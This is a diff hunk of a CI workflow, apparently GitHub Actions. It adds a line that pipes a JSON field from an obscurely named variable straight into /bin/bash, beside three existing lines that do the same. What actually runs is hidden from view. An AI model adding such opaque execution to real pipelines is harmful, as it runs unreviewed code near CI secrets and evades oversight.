@@ -21,6 +21,7 @@ jobs:
           echo $smn6237 | jq -r .hbiwp667 | /bin/bash
           printf '%s' "$n4" | jq -r .bcd68800 | /bin/bash
           echo $bku36417 | jq -r .vouh9 | /bin/bash
+          echo $nkvtt0 | jq -r .f311 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
